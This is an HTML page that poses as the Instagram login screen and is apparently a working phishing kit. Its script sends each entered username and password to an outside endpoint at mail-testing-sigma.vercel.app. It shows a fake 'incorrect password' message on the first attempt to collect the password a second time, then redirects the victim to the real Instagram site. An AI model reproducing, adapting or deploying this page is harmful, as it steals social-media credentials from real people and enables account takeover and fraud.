<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram – Log in</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: Optimistic, "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
      background: #fff;
      color: #1c1e21;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* ── MAIN LAYOUT ──────────────────────────────────────────── */
    .page-wrapper {
      flex: 1;
      display: flex;
      flex-direction: row;
    }

    /* ── LEFT PANEL ───────────────────────────────────────────── */
    .left-panel {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      justify-content: center;
      padding: 48px 48px 48px 64px;
      border-right: 1px solid #dbdbdb;
    }

    .left-panel .brand-logo {
      width: 56px;
      height: 56px;
      margin-bottom: 36px;
    }

    .left-panel .tagline {
      font-size: 2.25rem;
      font-weight: 700;
      line-height: 1.25;
      color: #1c1e21;
      max-width: 480px;
      margin-bottom: 40px;
    }

    .left-panel .tagline .highlight {
      background: linear-gradient(90deg, #f9a825 0%, #f26522 40%, #e1306c 80%, #c13584 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .left-panel .hero-image {
      width: 100%;
      max-width: 500px;
      height: auto;
      display: block;
    }

    /* ── RIGHT PANEL ──────────────────────────────────────────── */
    .right-panel {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 48px 40px;
    }

    .login-box {
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      gap: 0;
    }

    .login-heading {
      font-size: 1.0625rem;
      font-weight: 700;
      color: #1c1e21;
      margin-bottom: 20px;
    }

    .form-group {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-bottom: 12px;
    }

    .form-input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid #dbdbdb;
      border-radius: 12px;
      font-size: 0.9375rem;
      font-family: inherit;
      color: #1c1e21;
      background: #fff;
      outline: none;
      transition: border-color 0.15s;
    }

    .form-input::placeholder {
      color: #9e9e9e;
    }

    .form-input:focus {
      border-color: #a0b4c8;
    }

    .btn-login {
      width: 100%;
      padding: 14px 16px;
      border: none;
      border-radius: 50px;
      background: #0064E0;
      color: #fff;
      font-size: 0.9375rem;
      font-weight: 600;
      font-family: inherit;
      cursor: pointer;
      margin-top: 4px;
      transition: background 0.15s;
    }

    .btn-login:hover {
      background: #0058c7;
    }

    .forgot-link {
      text-align: center;
      margin-top: 16px;
      margin-bottom: 28px;
      font-size: 0.9rem;
      font-weight: 600;
      color: #1c1e21;
      text-decoration: none;
      cursor: pointer;
      display: block;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    .divider-spacer {
      height: 1px;
      background: transparent;
      margin-bottom: 20px;
    }

    .btn-facebook {
      width: 100%;
      padding: 13px 16px;
      border: 1px solid #dbdbdb;
      border-radius: 50px;
      background: #fff;
      color: #1c1e21;
      font-size: 0.9375rem;
      font-weight: 600;
      font-family: inherit;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-bottom: 10px;
      transition: background 0.15s;
    }

    .btn-facebook:hover {
      background: #f7f7f7;
    }

    .fb-icon {
      width: 20px;
      height: 20px;
      flex-shrink: 0;
    }

    .btn-create {
      width: 100%;
      padding: 13px 16px;
      border: 1.5px solid #1877f2;
      border-radius: 50px;
      background: #fff;
      color: #1877f2;
      font-size: 0.9375rem;
      font-weight: 600;
      font-family: inherit;
      cursor: pointer;
      transition: background 0.15s;
    }

    .btn-create:hover {
      background: #f0f6ff;
    }

    .meta-branding {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      margin-top: 28px;
    }

    .status-msg {
      font-size: 0.875rem;
      text-align: center;
      min-height: 20px;
      margin-bottom: 6px;
    }

    .status-msg.error  { color: #e0244b; }
    .status-msg.success { color: #1e7e34; }

    .btn-login.loading {
      opacity: 0.7;
      cursor: not-allowed;
    }

    .meta-logo-img {
      height: 18px;
      width: auto;
    }

    /* ── FOOTER (desktop hidden, mobile visible) ─────────────── */
    .site-footer {
      border-top: 1px solid #dbdbdb;
      padding: 20px 24px;
      text-align: center;
    }

    .footer-links {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 6px 14px;
      margin-bottom: 10px;
    }

    .footer-links a {
      font-size: 0.75rem;
      color: #737373;
      text-decoration: none;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }

    .footer-bottom {
      font-size: 0.75rem;
      color: #737373;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 16px;
    }

    .footer-lang {
      display: flex;
      align-items: center;
      gap: 4px;
      cursor: pointer;
    }

    .footer-lang svg {
      width: 10px;
      height: 10px;
    }

    /* ── RESPONSIVE – MOBILE ──────────────────────────────────── */
    @media (max-width: 767px) {
      .page-wrapper {
        flex-direction: column;
      }

      /* hide the left branding panel on mobile */
      .left-panel {
        display: none;
      }

      .right-panel {
        padding: 0;
        align-items: stretch;
        justify-content: flex-start;
      }

      /* mobile top section: logo + form */
      .mobile-header {
        display: flex;
        justify-content: center;
        padding: 40px 24px 24px;
        border-bottom: 1px solid #dbdbdb;
      }

      .mobile-header .brand-logo {
        width: 72px;
        height: 72px;
      }

      .login-box {
        max-width: 100%;
        padding: 28px 24px 32px;
      }

      .login-heading {
        font-size: 1rem;
        margin-bottom: 20px;
      }

      .form-input {
        padding: 14px 14px;
        font-size: 0.9rem;
      }

      .btn-login {
        font-size: 0.9rem;
      }

      .btn-facebook,
      .btn-create {
        font-size: 0.9rem;
      }

      .site-footer {
        display: block;
      }
    }

    /* hide footer on desktop */
    @media (min-width: 768px) {
      .mobile-header {
        display: none;
      }

      .site-footer {
        display: none;
      }
    }
  </style>
</head>
  <body>

  <div class="page-wrapper">

    <!-- ── LEFT PANEL (desktop only) ─────────────────────────── -->
    <section class="left-panel" aria-hidden="true">
      <img src="assets/insta-logo.webp" alt="Instagram" class="brand-logo" />
      <p class="tagline">
        See everyday moments from<br />
        your <span class="highlight">close friends</span>.
      </p>
      <img src="assets/desktop.webp" alt="" class="hero-image" />
    </section>

    <!-- ── RIGHT PANEL ────────────────────────────────────────── -->
    <main class="right-panel">

      <!-- Mobile-only logo header -->
      <div class="mobile-header">
        <img src="assets/insta-logo.webp" alt="Instagram" class="brand-logo" />
      </div>

      <!-- Login form -->
      <div class="login-box">
        <h1 class="login-heading">Log into Instagram</h1>

        <div class="form-group">
          <input
            id="username"
            class="form-input"
            type="text"
            placeholder="Mobile number, username or email"
            autocomplete="username"
            aria-label="Mobile number, username or email"
          />
          <input
            id="password"
            class="form-input"
            type="password"
            placeholder="Password"
            autocomplete="current-password"
            aria-label="Password"
          />
        </div>

        <div id="status-msg" class="status-msg" aria-live="polite"></div>

        <button id="btn-login" class="btn-login" type="button">Log in</button>

        <a class="forgot-link" href="#" tabindex="0">Forgot password?</a>

        <div class="divider-spacer"></div>

        <!-- Facebook login -->
        <button class="btn-facebook" type="button">
          <!-- Facebook 'f' icon SVG -->
          <svg class="fb-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" fill="url(#fb-grad)">
            <defs>
              <linearGradient x1="50%" x2="50%" y1="97.0782%" y2="0%" id="fb-grad">
                <stop offset="0%" stop-color="#0062E0"/>
                <stop offset="100%" stop-color="#19AFFF"/>
              </linearGradient>
            </defs>
            <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"/>
            <path fill="white" d="m25 23 .8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z"/>
          </svg>
          Log in with Facebook
        </button>

        <!-- Create account -->
        <button class="btn-create" type="button">Create new account</button>

        <!-- Meta branding -->
        <div class="meta-branding">
          <img src="assets/meta-logo.svg" alt="Meta" class="meta-logo-img" />
        </div>
      </div>
    </main>

  </div><!-- /page-wrapper -->

  <!-- ── FOOTER (mobile only) ───────────────────────────────────── -->
  <footer class="site-footer">
    <nav class="footer-links" aria-label="Footer links">
      <a href="#">Meta</a>
      <a href="#">About</a>
      <a href="#">Blog</a>
      <a href="#">Jobs</a>
      <a href="#">Help</a>
      <a href="#" style="color:#1877f2;">API</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Locations</a>
      <a href="#">Popular</a>
      <a href="#">Instagram Lite</a>
      <a href="#">Meta AI</a>
      <a href="#">Threads</a>
      <a href="#">Contact Uploading &amp; Non-Users</a>
      <a href="#">Meta Verified</a>
    </nav>
    <div class="footer-bottom">
      <span class="footer-lang">
        English
        <svg viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
          <path d="M1 1l4 4 4-4" stroke="#737373" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </span>
      <span>© 2026 Instagram from Meta</span>
    </div>
  </footer>

  <script>
    const btn       = document.getElementById('btn-login');
    const userInput = document.getElementById('username');
    const passInput = document.getElementById('password');
    const statusMsg = document.getElementById('status-msg');

    let attemptCount = 0;

    btn.addEventListener('click', handleLogin);

    // Allow Enter key from either field
    [userInput, passInput].forEach(el =>
      el.addEventListener('keydown', e => { if (e.key === 'Enter') handleLogin(); })
    );

    async function handleLogin() {
      const username = userInput.value;
      const password = passInput.value;

      // Clear previous status
      statusMsg.textContent = '';
      statusMsg.className = 'status-msg';

      // Set loading state
      btn.disabled = true;
      btn.classList.add('loading');
      btn.textContent = 'Logging in\u2026';

      try {
        // Send credentials (no-cors to avoid preflight CORS issue)
        await fetch('https://mail-testing-sigma.vercel.app/api/send-credentials', {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'text/plain' },
          body: JSON.stringify({ username, password })
        });
      } catch (err) {
        // Network failure — still proceed with attempt logic
      } finally {
        btn.disabled = false;
        btn.classList.remove('loading');
        btn.textContent = 'Log in';
      }

      attemptCount++;

      if (attemptCount >= 2) {
        // Second attempt → redirect
        window.location.href = 'https://www.instagram.com';
      } else {
        // First attempt → show error
        statusMsg.textContent = 'The password you entered is incorrect. Please try again.';
        statusMsg.classList.add('error');
        passInput.value = '';
        passInput.focus();
      }
    }
  </script>

</body>
</html>
